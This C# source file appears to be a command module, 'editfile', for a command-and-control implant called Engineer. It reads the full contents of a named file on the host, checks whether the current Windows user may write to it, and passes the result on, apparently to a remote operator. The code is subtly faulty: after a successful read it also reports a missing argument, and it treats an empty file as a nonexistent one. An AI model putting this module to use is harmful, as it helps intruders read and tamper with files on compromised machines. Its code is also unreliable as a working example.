using DynamicEngLoading;
using System;
using System.IO;
using System.Security.AccessControl;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class EditFileCommand : EngineerCommand
    {
        public override string Name => "editfile";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (task.Arguments.TryGetValue("/file", out string file))
                {
                    //read the content of file and return it
                    string content = File.ReadAllText(file);
                    if (content.Length == 0)
                    {
                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("file does not exist or has no content", task, EngTaskStatus.CompleteWithErrors,TaskResponseType.String);
                        return;
                    }
                    EditFile newfile = new EditFile();
                    newfile.FileName = file;
                    newfile.Content = content;
                    newfile.CanEdit = false;
                    //see if our current user has write access to the file
                    var fileRules = File.GetAccessControl(file).GetAccessRules(true, true, typeof(System.Security.Principal.NTAccount));
                    foreach (FileSystemAccessRule rule in fileRules)
                    {
                        if (rule.IdentityReference.Value == System.Security.Principal.WindowsIdentity.GetCurrent().Name)
                        {
                            if ((FileSystemRights.Write & (rule).FileSystemRights) == FileSystemRights.Write)
                            {
                                newfile.CanEdit = true;
                                break;
                            }
                        }
                    }
                    
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(newfile,task,EngTaskStatus.Complete,TaskResponseType.EditFile);
                }
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("no /file argument given",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
